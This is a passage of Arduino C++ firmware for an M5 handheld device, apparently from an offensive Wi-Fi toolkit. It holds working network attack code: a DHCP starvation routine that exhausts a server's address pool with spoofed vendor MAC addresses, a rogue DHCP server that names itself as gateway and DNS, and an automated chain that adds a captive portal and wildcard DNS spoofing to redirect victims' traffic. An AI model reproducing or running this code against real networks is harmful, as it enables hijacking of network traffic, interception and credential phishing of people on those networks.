  // Set the server IP address (siaddr)
  packetRogue[20] = rogueIPRogue[0];
  packetRogue[21] = rogueIPRogue[1];
  packetRogue[22] = rogueIPRogue[2];
  packetRogue[23] = rogueIPRogue[3];

  // DHCP Magic cookie
  packetRogue[236] = 0x63;
  packetRogue[237] = 0x82;
  packetRogue[238] = 0x53;
  packetRogue[239] = 0x63;

  // Start adding DHCP options
  int optionIndexRogue = 240;

  // DHCP Message Type (Option 53)
  packetRogue[optionIndexRogue++] = 53;   // Option
  packetRogue[optionIndexRogue++] = 1;    // Length
  packetRogue[optionIndexRogue++] = messageTypeRogue; // Message Type

  // Server Identifier (Option 54)
  packetRogue[optionIndexRogue++] = 54;   // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // Subnet Mask (Option 1)
  packetRogue[optionIndexRogue++] = 1;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = currentSubnetRogue[0];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[1];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[2];
  packetRogue[optionIndexRogue++] = currentSubnetRogue[3];

  // Router (Gateway) (Option 3)
  packetRogue[optionIndexRogue++] = 3;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = rogueIPRogue[0];
  packetRogue[optionIndexRogue++] = rogueIPRogue[1];
  packetRogue[optionIndexRogue++] = rogueIPRogue[2];
  packetRogue[optionIndexRogue++] = rogueIPRogue[3];

  // DNS Server (Option 6)
  packetRogue[optionIndexRogue++] = 6;    // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = currentDNSRogue[0];
  packetRogue[optionIndexRogue++] = currentDNSRogue[1];
  packetRogue[optionIndexRogue++] = currentDNSRogue[2];
  packetRogue[optionIndexRogue++] = currentDNSRogue[3];

  // Lease Time (Option 51)
  packetRogue[optionIndexRogue++] = 51;   // Option
  packetRogue[optionIndexRogue++] = 4;    // Length
  packetRogue[optionIndexRogue++] = 0x00;
  packetRogue[optionIndexRogue++] = 0x01;
  packetRogue[optionIndexRogue++] = 0x51;
  packetRogue[optionIndexRogue++] = 0x80; // 1-day lease time (86400 seconds)

  // End Option
  packetRogue[optionIndexRogue++] = 255;

  // Update packet size
  packetSizeRogue = optionIndexRogue;
}

void sendDHCPResponse(uint8_t *packetRogue, int packetSizeRogue) {
  // Send the packet to the client port (68)
  udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
  udp.write(packetRogue, packetSizeRogue);
  udp.endPacket();
}

uint8_t allocateIpAddress(uint8_t *clientMac) {
  // Check if this client already has an IP allocated
  for (int i = 0; i < MAX_CLIENTS; i++) {
    if (memcmp(clients[i].mac, clientMac, 6) == 0) {
      // Client found, return the allocated IP suffix
      return clients[i].ipSuffix;
    }
  }

  // Client not found, allocate a new IP
  for (int i = 0; i < numAvailableIps; i++) {
    if (!ipAllocatedRogue[i]) {
      ipAllocatedRogue[i] = true;
      // Store the client info
      for (int j = 0; j < MAX_CLIENTS; j++) {
        if (clients[j].ipSuffix == 0) { // Empty slot
          memcpy(clients[j].mac, clientMac, 6);
          clients[j].ipSuffix = availableIpSuffixesRogue[i];
          return clients[j].ipSuffix;
        }
      }
    }
  }
  return 0; // No available IPs
}


void updateDisplay(const char* message) {
  // Add the new message to the array
  displayLinesRogue[currentLineRogue] = String(message);
  currentLineRogue = (currentLineRogue + 1) % maxLinesRogue;

  // Clear the screen
  M5.Display.clear(menuBackgroundColor);

  // Display the last lines
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  int y = 12;
  for (int i = 0; i < maxLinesRogue; i++) {
    int index = (currentLineRogue - i - 1 + maxLinesRogue) % maxLinesRogue;
    if (!displayLinesRogue[index].isEmpty()) {
      M5.Display.setCursor(0, y);
      M5.Display.println(displayLinesRogue[index]);
      y += 16;
    }
  }

  M5.Display.display();
}


uint32_t totalIPs = 0;

uint32_t calculateTotalIPs(IPAddress subnetMask) {
  uint32_t mask = ((uint32_t)subnetMask[0] << 24) | ((uint32_t)subnetMask[1] << 16) | ((uint32_t)subnetMask[2] << 8) | subnetMask[3];
  uint8_t prefixLength = 0;
  for (int i = 0; i < 32; i++) {
    if (mask & (1UL << (31 - i))) {
      prefixLength++;
    } else {
      break;
    }
  }
  uint8_t hostBits = 32 - prefixLength;
  uint32_t totalIPs = 1UL << hostBits;
  return totalIPs;
}

IPAddress currentIPStarvation;
IPAddress currentSubnet;
IPAddress currentGateway;
IPAddress currentDNS;

// DHCP variables
IPAddress broadcastIP(255, 255, 255, 255);
uint8_t macBase[6] = {0xAE, 0xAD, 0xBE, 0xEF, 0x00, 0x00};
IPAddress dhcpServerIP;
bool dhcpServerDetected = false;

unsigned int localUdpPortStarvation = 67;

uint32_t discoverCount = 0;
uint32_t offerCount = 0;
uint32_t requestCount = 0;
uint32_t ackCount = 0;
uint32_t nakCount = 0;
IPAddress lastAssignedIP;

void saveCurrentNetworkConfig() {
  currentIPStarvation = WiFi.localIP();
  currentSubnet = WiFi.subnetMask();
  currentGateway = WiFi.gatewayIP();
  currentDNS = WiFi.dnsIP();

  totalIPs = calculateTotalIPs(currentSubnet);

  Serial.println("Current network saved:");
  Serial.print("IP: ");
  Serial.println(currentIPStarvation);
  Serial.print("Subnet mask: ");
  Serial.println(currentSubnet);
  Serial.print("Gateway: ");
  Serial.println(currentGateway);
  Serial.print("DNS: ");
  Serial.println(currentDNS);

  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Current network saved:");
  M5.Display.printf("IP: %s\n", currentIPStarvation.toString().c_str());
  M5.Display.printf("Subnet: %s\n", currentSubnet.toString().c_str());
  M5.Display.printf("Gateway: %s\n", currentGateway.toString().c_str());
  M5.Display.printf("DNS: %s\n", currentDNS.toString().c_str());
  M5.Display.display();
  delay(2000);
}

void disconnectWiFi() {
  WiFi.disconnect(true);
  Serial.println("WiFi disconnected.");

  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("WiFi disconnected.");
  M5.Display.display();
  delay(1000);
}

void configureStaticIP() {
  if (!WiFi.config(currentIPStarvation, currentGateway, currentSubnet, currentDNS)) {
    Serial.println("Failed to configure static IP.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Failed to configure\n static IP.");
    M5.Display.display();
    delay(2000);
  } else {
    Serial.println("Static IP configured successfully.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Static IP configured \nsuccessfully.");
    M5.Display.display();
    delay(1000);
  }
}

void reconnectWiFi(int networkIndex) {
  Serial.println("Reconnecting to WiFi...");
  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Reconnecting to WiFi...");
  M5.Display.display();

  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println("Network is open, no password required.");
    WiFi.begin(ssid.c_str()); // Connexion sans mot de passe
  } else {
    Serial.println("Network requires a password.");
    WiFi.begin(ssid.c_str(), password.c_str());
  }

  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
    M5.Display.print(".");
    M5.Display.display();
  }

  Serial.println("\nConnected to WiFi.");
  M5.Display.println("\nConnected to WiFi.");
  M5.Display.display();
  delay(1000);
}



void detectDHCPServer() {
  unsigned long startMillis = millis();
  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("Detecting DHCP server...");
  M5.Display.println("Press ENTER to cancel");
  M5.Display.display();
  dhcpServerDetected = false;

  while (millis() - startMillis < 16000) { // Maximum wait time of 16 seconds
    M5.update();
    if (M5.BtnB.isPressed()) {
      Serial.println("Detection cancelled by user");
      M5.Display.clear(menuBackgroundColor);
      M5.Display.setCursor(0, 0);
      M5.Display.printf("Detection cancelled");
      M5.Display.display();
      delay(2000);
      return;
    }

    sendDHCPDiscover(macBase); // Send DHCP Discover request

    // Wait for response for 5 seconds
    unsigned long responseStartMillis = millis();
    while (millis() - responseStartMillis < 5000) {
      int packetSize = udp.parsePacket();
      if (packetSize > 0) {
        uint8_t packetBuffer[512];
        udp.read(packetBuffer, packetSize);

        uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
        if (messageType == 2) { // DHCP Offer
          dhcpServerIP = IPAddress(packetBuffer[20], packetBuffer[21], packetBuffer[22], packetBuffer[23]);

          // Check if the detected DHCP server is 0.0.0.0
          if (dhcpServerIP.toString() == "0.0.0.0") {
            Serial.println("DHCP server detected as 0.0.0.0. Using gateway as fallback.");
            dhcpServerIP = currentGateway;
          }

          Serial.printf("DHCP server detected: %s\n", dhcpServerIP.toString().c_str());
          M5.Display.printf("DHCP server found:\n%s\n", dhcpServerIP.toString().c_str());
          M5.Display.display();
          dhcpServerDetected = true;
          delay(2000);
          return; // DHCP server found
        }
      }
    }
  }

  if (!dhcpServerDetected) {
    // Fallback to using the gateway as the DHCP server
    dhcpServerIP = currentGateway;
    Serial.println("No DHCP server detected. Using gateway as fallback.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.println("No DHCP server found.");
    M5.Display.println("Using gateway as fallback:");
    M5.Display.printf("Gateway: %s\n", dhcpServerIP.toString().c_str());
    M5.Display.display();
    delay(2000);
  }
}




int percentage = 0;
bool NAKFlagStarvation = false;
int NAKNumberStarvation = 50;

void startDHCPStarvation() {
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  discoverCount = 0;
  offerCount = 0;
  requestCount = 0;
  ackCount = 0;
  nakCount = 0;

  saveCurrentNetworkConfig();
  if (totalIPs == 0) {
    Serial.println("Error: Total IPs calculated as zero.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Error: Total IPs\ncalculated as zero.\nsettings to 255");
    totalIPs == 255;
    M5.Display.display();
    delay(2000);
  }
  disconnectWiFi();
  configureStaticIP();
  reconnectWiFi(currentListIndex);
  randomSeed(analogRead(0)); // Initialize random generator

  if (!udp.begin(68)) {
    Serial.println("Error: Failed to initialize UDP socket on port 68.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Error: Failed to init \nUDP socket");
    M5.Display.display();
    delay(2000);
    return;
  }

  Serial.println("System initialized. Ready to detect DHCP server...");
  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 0);
  M5.Display.println("System initialized");
  M5.Display.println("Starting DHCP detection...");
  M5.Display.display();
  delay(1000);

  detectDHCPServer();
  if (dhcpServerDetected) {
    Serial.println("DHCP server detected. Starting DHCP Starvation attack...");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Starvation running on:");
    M5.Display.printf("DHCP server:\n%s\n", dhcpServerIP.toString().c_str());
    M5.Display.display();
  } else {
    Serial.println("No DHCP server detected. Trying with broadcast.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 0);
    M5.Display.println("Starvation running on:");
    M5.Display.printf("Unknow DHCP server");
    M5.Display.display();
  }

  uint16_t i = 0;
  while (nakCount < NAKNumberStarvation) {
    M5.update();
    M5.update();

    if (M5.BtnB.isPressed()) {
      Serial.println("Attack stopped by user");
      M5.Display.println("Attack stopped");
      M5.Display.display();
      delay(1000);
      break;
    }

    generateRandomMAC(macBase, i); // Generate random MAC address
    completeDHCPTransaction(macBase); // Perform complete DHCP transaction

    float progress = (float)ackCount / totalIPs;
    percentage = (int)(progress * 100.0);
    // Update display with statistics
    M5.Display.fillRect(0, 50, M5.Display.width(), 50, menuBackgroundColor);
    M5.Display.setCursor(0, 50);
    M5.Display.printf("Pool percentage: %d%%\n", percentage);
    M5.Display.printf("Send Discover: %d\n", discoverCount);
    M5.Display.printf("Received Offer: %d\n", offerCount);
    M5.Display.printf("Send Request: %d\n", requestCount);
    M5.Display.printf("Received ACK: %d\n", ackCount);
    M5.Display.printf("Received NAK: %d\n", nakCount);
    M5.Display.print("Last IP:");
    M5.Display.print(lastAssignedIP.toString().c_str());
    M5.Display.print("        ");
    M5.Display.display();
    i++;
  }
  if (nakCount >= NAKNumberStarvation ) {
    Serial.println("The number of NAK suggest a successfull Starvation.");
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 30);
    M5.Display.println("DHCP Starvation Stopped.\n\nThe number of NAK suggest\na successfull DHCP \nStarvation !!!");
    M5.Display.display();
    delay(4000);
  }
  Serial.println("DHCP Starvation attack completed.");
  M5.Display.clear(menuBackgroundColor);
  M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
  M5.Display.setCursor(0, 40);
  M5.Display.println("DHCP Starvation Stopped.");
  M5.Display.printf("Pool percentage: %d%%\n", percentage);
  M5.Display.printf("Total Discover: %d\n", discoverCount);
  M5.Display.printf("Total Offer: %d\n", offerCount);
  M5.Display.printf("Total Request: %d\n", requestCount);
  M5.Display.printf("Total ACK: %d\n", ackCount);
  M5.Display.printf("Total NAK: %d\n", nakCount);
  M5.Display.display();
  delay(4000);
  waitAndReturnToMenu("Return to menu");
}

const uint8_t knownOUI[][3] = {
  {0x00, 0x1A, 0x2B}, // Cisco
  {0x00, 0x1B, 0x63}, // Apple
  {0x00, 0x1C, 0x4D}, // Intel
  {0xAC, 0xDE, 0x48}, // Broadcom
  {0xD8, 0x3C, 0x69}, // Huawei
  {0x3C, 0xA0, 0x67}, // Samsung
  {0xB4, 0x86, 0x55}, // Xiaomi
  {0xF4, 0x28, 0x53}, // TP-Link
  {0x00, 0x25, 0x9C}, // Dell
  {0x00, 0x16, 0xEA}, // LG Electronics
  {0x00, 0x1E, 0xC2}, // Sony
  {0x50, 0xCC, 0xF8}, // Microsoft
  {0x00, 0x24, 0xE8}, // ASUS
  {0x88, 0x32, 0x9B}, // Hewlett Packard
  {0x00, 0x26, 0xBB}, // Lenovo
  {0x78, 0xD7, 0xF7}, // Realtek Semiconductor
  {0xBC, 0x92, 0x6B}, // Xiaomi Communications
  {0x84, 0xA8, 0xE4}, // OnePlus Technology
  {0xD4, 0x25, 0x8B}, // Oppo Mobile
  {0x8C, 0x5A, 0xF0}, // Amazon Technologies
  {0xAC, 0x3C, 0x0B}, // Google
  {0x00, 0x17, 0xF2}, // Philips Lighting
  {0x00, 0x1D, 0x7E}, // Motorola
  {0xF8, 0x16, 0x54}, // ZTE Corporation
  {0xE8, 0x94, 0xF6}, // Vivo Mobile
  {0xF4, 0x09, 0xD8}, // Netgear
  {0x00, 0x0F, 0xB5}, // Buffalo
  {0x40, 0x16, 0x7E}, // PlayStation
  {0x68, 0x5B, 0x35}, // Nintendo
  {0xF4, 0x6D, 0x04}, // Fitbit
  {0x00, 0x1E, 0x3D}, // Blackberry
  {0x24, 0xD4, 0x42}, // Razer
  {0x4C, 0x32, 0x75}, // Logitech
  {0x74, 0x83, 0xEF}, // Roku
  {0x28, 0xA1, 0x83}, // Alienware (Dell)
  {0xB8, 0x27, 0xEB}, // Raspberry Pi Foundation
  {0x44, 0x65, 0x0D}, // Aruba Networks
  {0x38, 0xFF, 0x36}, // Juniper Networks
  {0x00, 0x23, 0x6C}  // Panasonic
};

void generateRandomMAC(uint8_t *mac, uint16_t iteration) {
  // Select random OUI
  uint8_t index = random(0, sizeof(knownOUI) / sizeof(knownOUI[0]));
  mac[0] = knownOUI[index][0];
  mac[1] = knownOUI[index][1];
  mac[2] = knownOUI[index][2];

  // Generate last 3 bytes randomly
  mac[3] = random(0x00, 0xFF);
  mac[4] = random(0x00, 0xFF);
  mac[5] = random(0x00, 0xFF);
}

const char* fixedHostname = "Evil-Client";

void sendDHCPDiscover(uint8_t *mac) {
  uint8_t dhcpDiscover[300] = {0};
  int index = 0;

  // Ethernet Header
  dhcpDiscover[index++] = 0x01; // OP: BOOTREQUEST
  dhcpDiscover[index++] = 0x01; // HTYPE: Ethernet
  dhcpDiscover[index++] = 0x06; // HLEN: MAC address length
  dhcpDiscover[index++] = 0x00; // HOPS: 0

  // Transaction ID
  uint32_t xid = random(1, 0xFFFFFFFF); // Ensure xid is not zero
  dhcpDiscover[index++] = (xid >> 24) & 0xFF;
  dhcpDiscover[index++] = (xid >> 16) & 0xFF;
  dhcpDiscover[index++] = (xid >> 8) & 0xFF;
  dhcpDiscover[index++] = xid & 0xFF;

  // Seconds and Flags
  dhcpDiscover[index++] = 0x00; // Seconds
  dhcpDiscover[index++] = 0x00;
  dhcpDiscover[index++] = 0x80; // Flags (Broadcast)
  dhcpDiscover[index++] = 0x00;

  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
  for (int i = 0; i < 16; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // Client MAC Address (chaddr)
  for (int i = 0; i < 6; i++) {
    dhcpDiscover[index++] = mac[i];
  }
  for (int i = 0; i < 10; i++) {
    dhcpDiscover[index++] = 0x00; // Padding to make chaddr 16 bytes
  }

  // sname: Server Host Name (64 bytes)
  for (int i = 0; i < 64; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // file: Boot File Name (128 bytes)
  for (int i = 0; i < 128; i++) {
    dhcpDiscover[index++] = 0x00;
  }

  // DHCP Magic Cookie
  dhcpDiscover[index++] = 0x63;
  dhcpDiscover[index++] = 0x82;
  dhcpDiscover[index++] = 0x53;
  dhcpDiscover[index++] = 0x63;

  // DHCP Options
  dhcpDiscover[index++] = 53; // DHCP Message Type Option
  dhcpDiscover[index++] = 1;  // Length
  dhcpDiscover[index++] = 1;  // DHCP Discover

  // Host Name Option (12)
  dhcpDiscover[index++] = 12;               // Option 12: Host Name
  dhcpDiscover[index++] = strlen(fixedHostname); // Length of the host name
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpDiscover[index++] = fixedHostname[i];  // Add the host name characters
  }


  dhcpDiscover[index++] = 55; // Parameter Request List
  dhcpDiscover[index++] = 4;  // Length
  dhcpDiscover[index++] = 1;  // Subnet Mask
  dhcpDiscover[index++] = 3;  // Router
  dhcpDiscover[index++] = 6;  // DNS Server
  dhcpDiscover[index++] = 15; // Domain Name
  dhcpDiscover[index++] = 255; // End Option

  // Send the packet
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpDiscover, index);
    udp.endPacket();
    discoverCount++;
    Serial.println("Sent DHCP Discover with Host Name...");
  } else {
    Serial.println("Failed to send DHCP Discover.");
    M5.Display.setCursor(0, M5.Display.height() - 40);
    M5.Display.println("Failed to send DHCP Discover");
    M5.Display.display();
  }
}

void sendDHCPRequest(uint8_t *mac, IPAddress offeredIP, IPAddress dhcpServerIP) {
  uint8_t dhcpRequest[300] = {0};
  int index = 0;

  // Ethernet Header
  dhcpRequest[index++] = 0x01; // OP: BOOTREQUEST
  dhcpRequest[index++] = 0x01; // HTYPE: Ethernet
  dhcpRequest[index++] = 0x06; // HLEN: MAC address length
  dhcpRequest[index++] = 0x00; // HOPS: 0

  // Transaction ID
  uint32_t xid = random(1, 0xFFFFFFFF); // Unique transaction ID
  dhcpRequest[index++] = (xid >> 24) & 0xFF;
  dhcpRequest[index++] = (xid >> 16) & 0xFF;
  dhcpRequest[index++] = (xid >> 8) & 0xFF;
  dhcpRequest[index++] = xid & 0xFF;

  // Seconds and Flags
  dhcpRequest[index++] = 0x00; // Seconds
  dhcpRequest[index++] = 0x00;
  dhcpRequest[index++] = 0x80; // Flags (Broadcast)
  dhcpRequest[index++] = 0x00;

  // IP Addresses (ciaddr, yiaddr, siaddr, giaddr)
  for (int i = 0; i < 16; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // Client MAC Address (chaddr)
  for (int i = 0; i < 6; i++) {
    dhcpRequest[index++] = mac[i];
  }
  for (int i = 0; i < 10; i++) {
    dhcpRequest[index++] = 0x00; // Padding to make chaddr 16 bytes
  }

  // sname: Server Host Name (64 bytes)
  for (int i = 0; i < 64; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // file: Boot File Name (128 bytes)
  for (int i = 0; i < 128; i++) {
    dhcpRequest[index++] = 0x00;
  }

  // DHCP Magic Cookie
  dhcpRequest[index++] = 0x63;
  dhcpRequest[index++] = 0x82;
  dhcpRequest[index++] = 0x53;
  dhcpRequest[index++] = 0x63;

  // DHCP Options
  dhcpRequest[index++] = 53; // DHCP Message Type Option
  dhcpRequest[index++] = 1;  // Length
  dhcpRequest[index++] = 3;  // DHCP Request

  // Requested IP Address Option
  dhcpRequest[index++] = 50; // Requested IP Address
  dhcpRequest[index++] = 4;  // Length
  dhcpRequest[index++] = offeredIP[0];
  dhcpRequest[index++] = offeredIP[1];
  dhcpRequest[index++] = offeredIP[2];
  dhcpRequest[index++] = offeredIP[3];

  // DHCP Server Identifier Option
  dhcpRequest[index++] = 54; // DHCP Server Identifier
  dhcpRequest[index++] = 4;  // Length
  dhcpRequest[index++] = dhcpServerIP[0];
  dhcpRequest[index++] = dhcpServerIP[1];
  dhcpRequest[index++] = dhcpServerIP[2];
  dhcpRequest[index++] = dhcpServerIP[3];

  // Host Name Option (12)
  dhcpRequest[index++] = 12;               // Option 12: Host Name
  dhcpRequest[index++] = strlen(fixedHostname); // Length of the host name
  for (size_t i = 0; i < strlen(fixedHostname); i++) {
    dhcpRequest[index++] = fixedHostname[i];  // Add the host name characters
  }

  dhcpRequest[index++] = 255; // End Option

  // Send the packet
  if (udp.beginPacket(broadcastIP, 67)) {
    udp.write(dhcpRequest, index);
    udp.endPacket();
    requestCount++;
    Serial.println("Sent DHCP Request with Host Name...");
  } else {
    Serial.println("Failed to send DHCP Request.");
    M5.Display.setCursor(0, M5.Display.height() - 40);
    M5.Display.println("Failed to send DHCP Request");
    M5.Display.display();
  }
}

// Complete DHCP Transaction
void completeDHCPTransaction(uint8_t *mac) {
  sendDHCPDiscover(mac);
  Serial.println("DHCP Discover sent. Waiting for DHCP Offer...");

  unsigned long offerWaitStart = millis();
  while (millis() - offerWaitStart < 2000) {
    int packetSize = udp.parsePacket();
    if (packetSize > 0) {
      uint8_t packetBuffer[512];
      udp.read(packetBuffer, packetSize);

      uint8_t messageType = parseDHCPMessageType(packetBuffer, packetSize);
      if (messageType == 6) { // DHCP NAK
        nakCount++;
        Serial.println("Received DHCP NAK");
        return;
      } else if (messageType == 2) { // DHCP Offer
        offerCount++;
        IPAddress offeredIP(packetBuffer[16], packetBuffer[17], packetBuffer[18], packetBuffer[19]);
        Serial.printf("Offered IP: %s\n", offeredIP.toString().c_str());
        lastAssignedIP = offeredIP;

        sendDHCPRequest(mac, offeredIP, dhcpServerIP);

        unsigned long ackWaitStart = millis();
        while (millis() - ackWaitStart < 2000) {
          int ackPacketSize = udp.parsePacket();
          if (ackPacketSize > 0) {
            udp.read(packetBuffer, ackPacketSize);

            uint8_t ackMessageType = parseDHCPMessageType(packetBuffer, ackPacketSize);
            if (ackMessageType == 5) { // DHCP ACK
              ackCount++;
              Serial.printf("IP successfully assigned: %s\n", offeredIP.toString().c_str());
              return;
            } else if (ackMessageType == 6) { // DHCP NAK
              nakCount++;
              Serial.println("Received DHCP NAK");
              return;
            }
          }
        }
        Serial.println("No DHCP ACK received.");
        return;
      }
    }
  }
  Serial.println("No DHCP Offer received.");
}

// DHCP packet analysis
uint8_t parseDHCPMessageType(uint8_t *packet, int packetSize) {
  if (packetSize < 244 || packet[236] != 0x63 || packet[237] != 0x82 || packet[238] != 0x53 || packet[239] != 0x63) {
    return 0; // Not a DHCP packet
  }
  for (int i = 240; i < packetSize; i++) {
    if (packet[i] == 53 && packet[i + 1] == 1) {
      return packet[i + 2];
    }
  }
  return 0;
}

void switchDNS() {
  ipAP = WiFi.softAPIP();
  ipSTA = WiFi.localIP();
  dnsServer.stop();  // Stop the current DNS server
  useAP = !useAP;    // Toggle between AP and STA modes
  IPAddress newIP = useAP ? ipAP : ipSTA;
  dnsServer.start(DNS_PORT, "*", newIP);  // Restart the DNS server with the new IP
  Serial.print("DNS restarted with IP: \n");
  Serial.println(newIP);

  // Build the message with the current DNS IP
  String message = "DNS reset, new IP: \n" + newIP.toString();
  waitAndReturnToMenu(message.c_str());  // Pass the message as an argument
}


void rogueDHCPAuto() {
  rogueIPRogue = WiFi.localIP();
  currentSubnetRogue = WiFi.subnetMask();
  currentGatewayRogue = WiFi.localIP();
  currentDNSRogue = WiFi.localIP();

  udp.begin(localUdpPort);

  M5.Display.clear(menuBackgroundColor);
  Serial.println("Rogue DHCP running...");
  updateDisplay("DHCP running...");

  unsigned long startTime = millis(); // Enregistrer le temps de début

  while (millis() - startTime < 15000) { // Boucle pendant 15 secondes
    M5.update();
    M5.update();
    handleDnsRequestSerial();

    int packetSizeRogue = udp.parsePacket();
    if (packetSizeRogue > 0 && packetSizeRogue <= 512) {
      Serial.printf("Received packet, size: %d bytes\n", packetSizeRogue);
      updateDisplay("Packet received");

      uint8_t packetBufferRogue[512];
      udp.read(packetBufferRogue, packetSizeRogue);

      uint8_t messageTypeRogue = getDHCPMessageType(packetBufferRogue, packetSizeRogue);

      if (messageTypeRogue == 1) { // DHCP Discover
        Serial.println("DHCP Discover received. Preparing Offer...");
        updateDisplay("Discover. Preparing Offer...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 2); // Message Type 2: DHCP Offer

        // Send the DHCP Offer
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP Offer sent.");
        updateDisplay("Offer sent.");

      } else if (messageTypeRogue == 3) { // DHCP Request
        Serial.println("DHCP Request received. Preparing ACK...");
        updateDisplay("Request. Preparing ACK...");
        prepareDHCPResponse(packetBufferRogue, packetSizeRogue, 5); // Message Type 5: DHCP ACK

        // Send the DHCP ACK
        sendDHCPResponse(packetBufferRogue, packetSizeRogue);
        Serial.println("DHCP ACK sent.");
        updateDisplay("ACK sent.");
      }
    }
  }
  updateDisplay("Rogue DHCP stopped.");
}


void DHCPAttackAuto() {
  bool DHCPDNSExplain = false;
  if (confirmPopup("Some explanation ?")) {
    DHCPDNSExplain = true;
  }
  if (DHCPDNSExplain) {
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 20);
    M5.Display.println("Step 1 : DHCP Starvation.");
    M5.Display.println("Send multiple fake new");
    M5.Display.println("client to saturate the");
    M5.Display.println("the pool of available");
    M5.Display.println("IP address that DHCP can");
    M5.Display.println("provide. NAK = Starvation");
    M5.Display.println("Press Enter to start");
    M5.Display.display();
    while (!M5.BtnB.isPressed()) {
      M5.update();
      M5.update();
      delay(100);
    }
  }
  startDHCPStarvation();
  enterDebounce();
  if (DHCPDNSExplain) {
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 20);
    M5.Display.println("Step 2 : Rogue DHCP.");
    M5.Display.println("The Original DHCP cant");
    M5.Display.println("provide new IP so we");
    M5.Display.println("now answering any DHCP");
    M5.Display.println("request with hijacked");
    M5.Display.println("DNS that at evil IP.");
    M5.Display.println("Press Enter to start");
    M5.Display.display();
    while (!M5.BtnB.isPressed()) {
      M5.update();
      M5.update();
      delay(100);
    }
  }
  rogueDHCPAuto();
  enterDebounce();
  if (DHCPDNSExplain) {
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 20);
    M5.Display.println("Step 3 : Start the Web");
    M5.Display.println("server with DNS Spoofing.");
    M5.Display.println("Start the portal to");
    M5.Display.println("provide page and DNS.");
    M5.Display.println("The DNS spoof any request");
    M5.Display.println("to redirect to the evil.");
    M5.Display.println("Press Enter to start");
    M5.Display.display();
    while (!M5.BtnB.isPressed()) {
      M5.update();
      M5.update();
      delay(100);
    }
  }
  createCaptivePortal();
  enterDebounce();
  if (DHCPDNSExplain) {
    M5.Display.clear(menuBackgroundColor);
    M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
    M5.Display.setCursor(0, 20);
    M5.Display.println("Step 4 : Change DNS IP.");
    M5.Display.println("Changing DNS IP with");
    M5.Display.println("local IP address to");
    M5.Display.println("provide Spoffed DNS query.");
    M5.Display.println("Press Enter to change");
    M5.Display.display();
    while (!M5.BtnB.isPressed()) {
      M5.update();
      M5.update();
      delay(100);
    }
  }
  switchDNS();
}






// Global vector for detected printers
std::vector<IPAddress> detectedPrinters;

// Checks if a host is a printer (port 9100 open)
bool isPrinter(IPAddress ip, uint32_t timeout_ms = 150) {
  WiFiClient client; // Instance of WiFiClient
